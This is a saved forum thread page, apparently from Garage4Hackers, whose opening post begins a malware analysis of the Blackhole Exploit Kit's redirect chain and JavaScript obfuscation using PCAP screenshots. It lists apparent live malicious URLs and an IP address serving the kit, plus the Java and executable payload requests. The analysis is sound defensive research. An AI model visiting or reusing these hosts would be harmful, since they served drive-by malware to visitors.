+  writeLink(7674, 0, 0, 8, "T", "<i>Cool stuff buddy, any idea...</i>", "05-02-2012", "06:49 AM", 0, "showthreadaf88.html?t=2250&amp;p=7674#post7674");
+  writeLink(7814, 0, 0, 18, "T", "<i>Nice and in depth analysis!...</i>", "05-22-2012", "05:34 PM", 0, "showthreada0d7.html?t=2250&amp;p=7814#post7814");
+  writeLink(8048, 0, 0, 61, "T", "<i>Namaste \nNice explanation and...</i>", "06-20-2012", "04:15 PM", 0, "showthreadd971-2.html?t=2250&amp;p=8048#post8048");
+  writeLink(8049, 0, 0, 2916, "L", "<i>nice post buddy.....love...</i>", "06-20-2012", "04:37 PM", 0, "showthreade28a.html?t=2250&amp;p=8049#post8049");
+    writeLink(10380, 0, 0, 191, "1,L", "<i>I encountered a similar...</i>", "04-05-2013", "08:15 PM", 0, "showthread2740.html?t=2250&amp;p=10380#post10380");
+
+		//-->
+		</script>
+	</div>
+</div>
+	
+
+	
+		<ol id="posts" class="posts" start="1">
+			
+<li class="postbitlegacy postbitim postcontainer old" id="post_7663">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">04-30-2012,&nbsp;<span class="time">11:03 AM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post7663" href="showthread9189-4.html?t=2250&amp;p=7663&amp;viewfull=1#post7663" class="postcounter">#1</a><a id="postcount7663" name="1"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberdb73.html?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberdb73.html?u=311" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="search9737.html?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="private1fcf.html?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogdb73.html?u=311" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list1ee8.html?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="c0d3inj3cT is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Garage Member
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_7663_311" title="c0d3inj3cT will become famous soon enough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Dec 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>67</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogdb73.html?u=311">2</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow">
+				
+				
+				<h2 class="title icon">
+					Blackhole Exploit Kit
+				</h2>
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_7663">
+						<blockquote class="postcontent restore ">
+							It's been out there in the wild for quite sometime. It is a good package of multiple Exploits targeting client side vulnerabilities in Java, Adobe, Shockwave. You can find it uploaded on compromised websites or malicious domains.<br />
+<br />
+I will discuss an interesting aspect of this exploit kit, JavaScript Obfuscation. There are some good techniques used in obfuscating the JS Code which allows it to bypass AV. Even the automated JS Unpackers and Deobfuscators are unable to handle the Obfuscated Code.<br />
+<br />
+It gives us an opportunity to manually deobfuscate the code. If you are into Reversing Custom Packed Malwares, then I hope you understand the excitement in manually analyzing the code <img src="images/smilies/smile.html" border="0" alt="" title="Smile" class="inlineimg" /><br />
+<br />
+Let's start with a brief overview of how this exploit kit is being deployed on various sites. I'll try to put as many screenshots as possible just in case you prefer a visual writeup better:<br />
+<br />
+You visit a web page with a URL looking like:<br />
+<br />
+hxxp://www.checkthisout.com/&lt;random 8 alphanumeric chars&gt;/index.html<br />
+<br />
+For instance, I found this one in the wild: hxxp://polumin.hu/yoKUoxiG/index.html<br />
+<br />
+The PCAP Screenshots follow:<br />
+<br />
+<img src="attachmentf06c.jpg?attachmentid=344&amp;d=1335762785" border="0" alt="Name:  uLKWt.jpg
+Views: 1243
+Size:  21.7 KB"  style="float: CONFIG" /><br />
+<br />
+HTTP Response tells us that it is gzip encoded. (&quot;Content-Encoding: gzip&quot;)<br />
+<br />
+Let's decode it and we get:<br />
+<br />
+<img src="attachmentf4b0.png?attachmentid=345&amp;d=1335762866" border="0" alt="Name:  JOpJB.png
+Views: 1251
+Size:  2.8 KB"  style="float: CONFIG" /><br />
+<br />
+So, it is redirecting us to: <a href="../terramaresturismo.com.br/MeyBxZaD/js.js" target="_blank">http://terramaresturismo.com.br/MeyBxZaD/js.js</a><br />
+<br />
+Interesting. Let's keep following it to get to the good stuff <img src="images/smilies/smile.html" border="0" alt="" title="Smile" class="inlineimg" /><br />
+<br />
+Next PCAP:<br />
+<br />
+<img src="attachment03d0.jpg?attachmentid=346&amp;d=1335762907" border="0" alt="Name:  AiyOh.jpg
+Views: 1236
+Size:  21.5 KB"  style="float: CONFIG" /><br />
+<br />
+So, the previously discovered JS is again redirecting us to:<br />
+<br />
+<a href="../external.html?link=http://69.194.192.229/showthread.php?t=d7ad916d1c0396ff" target="_blank">http://69.194.192.229/showthread.php?t=d7ad916d1c0396ff</a><br />
+<br />
+Hop onto it:<br />
+<br />
+PCAP:<br />
+<br />
+<a href="../external.html?link=http://imgur.com/aqGdX" target="_blank">http://i.imgur.com/aqGdX.png</a><br />
+<br />
+Aren't you delighted to see the HTTP Response?<br />
+<br />
+We have a huge obfuscated JS code in response.<br />
+<br />
+But analyzing further, we notice that it sends another chunk of obfuscated JS in response:<br />
+<br />
+PCAP:<br />
+<br />
+<a href="../external.html?link=http://imgur.com/teTk3" target="_blank">http://i.imgur.com/teTk3.png</a><br />
+<br />
+Overwhelming! Now, we have 2 obfuscated JS to analyze.<br />
+<br />
+Let us save and keep them safe. We have to analyze them further.<br />
+<br />
+If we look at the PCAP, this is followed by an HTTP Request for Klot.jar and a random name executable.<br />
+<br />
+I'll just put the display filter, http.request.method == &quot;GET&quot; and let you take a look for yourself:<br />
+<br />
+<img src="attachmentcfc1.jpg?attachmentid=347&amp;d=1335763856" border="0" alt="Name:  DpIWS.jpg
+Views: 1211
+Size:  21.1 KB"  style="float: CONFIG" />
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_7663" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_7663" class="newreply" href="newreply8bf6.html?do=newreply&amp;p=7663" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7663" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+		</ol>
+                <div class="separator"></div>
+		<div class="postlistfoot">
+			
+		</div>
+
+	
+
+</div>
+
+<div id="below_postlist" class="noinlinemod below_postlist">
+	
+	<div id="pagination_bottom" class="pagination_bottom">
+	
+		<div class="clear"></div>
+<div class="navpopupmenu popupmenu nohovermenu" id="showthread_navpopup">
+	
+		<span class="shade">Quick Navigation</span>
+		<a href="showthreada0d3.html?t=2250" class="popupctrl"><span class="ctrlcontainer">Reverse Engineering and Application Cracking</span></a>
+		<a href="showthreada0d3.html?t=2250#top" class="textcontrol" onclick="document.location.hash='top';return false;">Top</a>
+	
+	<ul class="navpopupbody popupbody popuphover">
+		
+		<li class="optionlabel">Site Areas</li>
+		<li><a href="usercp.html">Settings</a></li>
+		<li><a href="private.html">Private Messages</a></li>
+		<li><a href="subscription.html">Subscriptions</a></li>
+		<li><a href="online.html">Who's Online</a></li>
+		<li><a href="search.html">Search Forums</a></li>
+		<li><a href="forum.html">Forums Home</a></li>
+		
+			<li class="optionlabel">Forums</li>
+			
+		
+			
+				<li><a href="forumdisplay58da.html?f=1">Garage Network</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay12a3.html?f=2">Garage Announcements</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaye57d.html?f=58">Bravo - Null 2012</a></li>
+			
+		
+			
+				<li><a href="forumdisplay0756.html?f=59">Garage Local Chapter Meets</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay31e6.html?f=4">Garage Rules</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye774.html?f=5">Feedback &amp; Suggestions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayd42b.html?f=7">Introduce Your Self</a></li>
+			
+		
+			
+				<li><a href="forumdisplay2b89.html?f=38">Shout-box</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplaycf19.html?f=6">Garage Lounge</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay5579.html?f=30">Hacking for Beginners</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay6ac3.html?f=57">Did You Know?</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay957d.html?f=8">Security &amp; Hacking News Thread</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3215.html?f=36">Career in InfoSec</a></li>
+			
+		
+			
+				<li><a href="forumdisplay814c.html?f=29">Request Zone</a></li>
+			
+		
+			
+				<li><a href="forumdisplay13b6.html?f=27">Noobs Corner</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplayfac0.html?f=55">Tip | Trick of the Day</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4a6.html?f=66">ICS / SCADA Security</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6111.html?f=67">Internet of Things - IoT</a></li>
+			
+		
+			
+				<li><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaya05c.html?f=56">Post Exploitation</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay8a83.html?f=11">Web Application Penetration Testing</a></li>
+			
+		
+			
+				<li><a href="forumdisplay01c9.html?f=12">Wireless and Bluetooth Hacking</a></li>
+			
+		
+			
+				<li><a href="forumdisplay48ab.html?f=17">Computer Forensics and Incident Handling</a></li>
+			
+		
+			
+				<li><a href="forumdisplay218b.html?f=19">Physical Security and Social Engineering</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb09f.html?f=15">General Security &amp; Best Practices</a></li>
+			
+		
+			
+				<li><a href="forumdisplay907f.html?f=42">Security and Hacking Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplay9e0d.html?f=54">Mobile Security</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay9780.html?f=14">General Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay9df8.html?f=31">Programming</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay65b9.html?f=35">Assembly</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4f1.html?f=32">C/C++</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb0a0.html?f=34">Perl</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb8c1.html?f=60">PHP</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6c4e.html?f=33">Python</a></li>
+			
+		
+			
+				<li><a href="forumdisplay208f.html?f=51">Linux Shell / Bash Programming</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3238.html?f=47">Windows Batch Programming</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayce40.html?f=28">BackTrack and Other Linux Distributions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf2fa.html?f=16">Networks &amp; Networking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya213.html?f=18">Cloud Computing</a></li>
+			
+		
+			
+				<li><a href="forumdisplaydfa4.html?f=39">Security Podcast and Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya3f5.html?f=40">Miscellanous Thread</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay30ac.html?f=49">Brush Up Your Skills</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayffeb.html?f=20">Experts Forum</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplaycdba.html?f=48">My Meanest Hacks</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf6ac.html?f=37">Hacking &amp; Security Books and Tutorials</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8011.html?f=23">Tools &amp; Scripts</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
+			
+		
+			
+				<li><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
+			
+		
+			
+				<li><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye5f3.html?f=64">Browser Fuzzing</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+		
+	</ul>
+</div>
+<div class="clear"></div>
+	</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+<!-- next / previous links -->
+<div class="navlinks">
+	
+	<strong>&laquo;</strong>
+	<a href="showthreadb922.html?t=2250&amp;goto=nextoldest" rel="nofollow">Previous Thread</a>
+	|
+	<a href="showthread718b-2.html?t=2250&amp;goto=nextnewest" rel="nofollow">Next Thread</a>
+	<strong>&raquo;</strong>
+	
+</div>
+<!-- / next / previous links -->
+
+<div id="thread_info" class="thread_info">
+	
+	
+	
+	
+	<div class="options_block_container">
+		
+		<div class="options_block">
+			<h4 class="collapse">
+				<a class="collapse" id="collapse_posting_rules" href="showthreada0d3.html?t=2250#top"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				<span class="optiontitle">Posting Permissions</span>
+			</h4>
+			<div id="posting_rules" class="thread_info_block">
+				
+<div id="forumrules" class="info_subblock">
+
+	<ul class="youcandoblock">
+		<li>You <strong>may not</strong> post new threads</li>
+		<li>You <strong>may not</strong> post replies</li>
+		<li>You <strong>may not</strong> post attachments</li>
+		<li>You <strong>may not</strong> edit your posts</li>
+		<li>&nbsp;</li>
+	</ul>
+	<div class="bbcodeblock">
+		<ul>
+			<li><a href="miscaff0.html?do=bbcode" target="_blank">BB code</a> is <strong>On</strong></li>
+			<li><a href="misc9712.html?do=showsmilies" target="_blank">Smilies</a> are <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#imgcode" target="_blank">[IMG]</a> code is <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#videocode" target="_blank">[VIDEO]</a> code is <strong>On</strong></li>
+			<li>HTML code is <strong>Off</strong></li>
+		</ul>
+	</div>
+	<p class="rules_link"><a href="misc17ec.html?do=showrules" target="_blank">Forum Rules</a></p>
+
+</div>
+
+			</div>
+		</div>
+
+	</div>
+
+</div>
+
+
+
+
+
+<!-- lightbox scripts -->
+	<script type="text/javascript">
+	<!--
+	vBulletin.register_control("vB_Lightbox_Container", "posts", 1);
+	//-->
+	</script>
+<!-- / lightbox scripts -->
+
+
+
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="showthreada0d3.html?t=2250#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">05:51 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	<img src="cron3608.gif?rand=1584879683" alt="" width="1" height="1" border="0" />
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
